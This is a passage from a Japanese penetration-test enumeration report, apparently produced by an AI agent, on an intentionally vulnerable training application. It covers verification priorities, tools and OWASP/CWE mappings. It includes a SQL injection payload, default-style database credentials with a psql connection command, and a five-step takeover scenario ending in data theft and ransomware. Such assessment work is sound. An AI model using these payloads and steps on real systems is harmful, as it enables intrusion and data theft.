#### 必須検証項目（P0）

1. **SQLインジェクション**
   - 全6エンドポイントでの悪用可能性確認
   - sqlmap による自動化検証
   - Union-based / Error-based / Time-based SQLi の検証
   - データベース完全ダンプの試行

2. **データベース直接アクセス**
   - `localhost:15432` への外部接続テスト
   - 弱い認証情報（postgres/postgres123）の確認
   - データ削除・改ざんのシミュレーション

3. **安全でないデシリアライズ**
   - ysoserial.net ペイロードの生成
   - RCE（リモートコード実行）の実証
   - サーバー侵害範囲の確認

4. **認証バイパス**
   - 全エンドポイントへの無認証アクセス確認
   - 管理者アカウント削除の実行
   - CRUD操作の完全検証

#### 推奨検証ツール

| ツール | 用途 | 対象脆弱性 |
|--------|------|-----------|
| **sqlmap** | SQLインジェクション自動検証 | I-01 ~ I-06 |
| **Burp Suite Pro** | 手動検証・インターセプト | 全体 |
| **OWASP ZAP** | 自動スキャン・AJAX Spider | 全Web脆弱性 |
| **ysoserial.net** | .NETデシリアライズペイロード | CO-01 |
| **Nikto** | Webサーバー設定検査 | CM-03, CM-04 |
| **psql** | PostgreSQL直接接続 | CM-01 |
| **XSS Hunter** | XSS検証・Blind XSS | I-07 |

### 5.2 レポーティング推奨事項

#### PoC（概念実証）の作成

各Critical脆弱性について、以下を含むPoCを作成すること:
- エクスプロイトコード（スクリプト）
- 実行手順
- スクリーンショット/動画
- 影響範囲の詳細

#### リスク評価の精緻化

- CVSS v3.1 スコアの再計算
- ビジネス影響度の評価
- 悪用可能性の定量化

---

## 6. 統計サマリー

### 6.1 脆弱性分布

```
Critical (11件):
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 46%

High (8件):
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 33%

Medium (5件):
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 21%

Low (0件):
 0%
```

### 6.2 OWASP Top 10 (2021) マッピング

| OWASP カテゴリ | 該当脆弱性数 | 割合 |
|---------------|------------|------|
| **A01: Broken Access Control** | 5 | 21% |
| **A02: Cryptographic Failures** | 3 | 13% |
| **A03: Injection** | 7 | 29% |
| **A05: Security Misconfiguration** | 5 | 21% |
| **A07: Identification and Authentication Failures** | 3 | 13% |
| **A08: Software and Data Integrity Failures** | 1 | 4% |
| **合計** | **24** | **100%** |

### 6.3 CWE Top 25 マッピング

本アプリケーションは、**CWE Top 25（最も危険なソフトウェア脆弱性）のうち10項目**を含んでいます:

1. CWE-89: SQLインジェクション ✅ (6箇所)
2. CWE-79: XSS ✅ (1箇所)
3. CWE-287: 認証の欠如 ✅ (2箇所)
4. CWE-22: ディレクトリトラバーサル ✅ (1箇所)
5. CWE-352: CSRF ✅ (1箇所)
6. CWE-502: 安全でないデシリアライズ ✅ (1箇所)
7. CWE-798: ハードコードされた認証情報 ✅ (4箇所)
8. CWE-312: 平文での機密情報保存 ✅ (2箇所)
9. CWE-319: 平文通信 ✅ (1箇所)
10. CWE-250: 不要な権限での実行 ✅ (2箇所)

---

## 7. 結論

### 7.1 総合リスク評価

**リスクレベル**: 🔴 **CRITICAL（最重大）**

本アプリケーションは、**意図的に脆弱性を埋め込んだ学習用環境**であり、実運用環境では**絶対に使用してはいけません**。

主要な問題点:
1. ✅ **認証・認可が完全に欠如** → 誰でも全機能にアクセス可能
2. ✅ **SQLインジェクションが6箇所** → データベース完全掌握可能
3. ✅ **データベースが外部公開** → 直接侵入可能
4. ✅ **パスワードが平文保存** → 即座全アカウント侵害
5. ✅ **RCE脆弱性（デシリアライズ）** → サーバー完全掌握

### 7.2 悪用シナリオ例

攻撃者が以下の手順で5分以内にシステムを完全掌握可能:

1. **Step 1**: `/api/users?search=' OR '1'='1' --` でSQLインジェクション → 全ユーザー情報取得（平文パスワード含む）
2. **Step 2**: 取得した管理者パスワードで `psql -h localhost -p 15432` で直接DB接続
3. **Step 3**: `/api/import` に ysoserial.net ペイロードを送信 → RCE達成
4. **Step 4**: サーバー内で横展開攻撃 → 全コンテナ侵害
5. **Step 5**: データの窃取・改ざん・削除・ランサムウェア展開

### 7.3 次フェーズ（検証）への移行基準

以下の準備が完了したら、検証フェーズ（Phase 05）へ移行:

✅ 本列挙レポートの承認  
✅ 検証環境の準備（スナップショット取得）  
✅ 検証ツールの準備（sqlmap, Burp Suite, ysoserial.net等）  
✅ PoC作成の準備（スクリーンキャプチャツール等）  
✅ バックアップ体制の確立

---

**次フェーズ**: `05-verification.agent.md`（検証）へ進む

**レポート作成者**: 04-enumeration.agent  
**レポート作成日時**: 2026-02-08 09:22:10 UTC  
**レポート形式**: Markdown  
**文字コード**: UTF-8
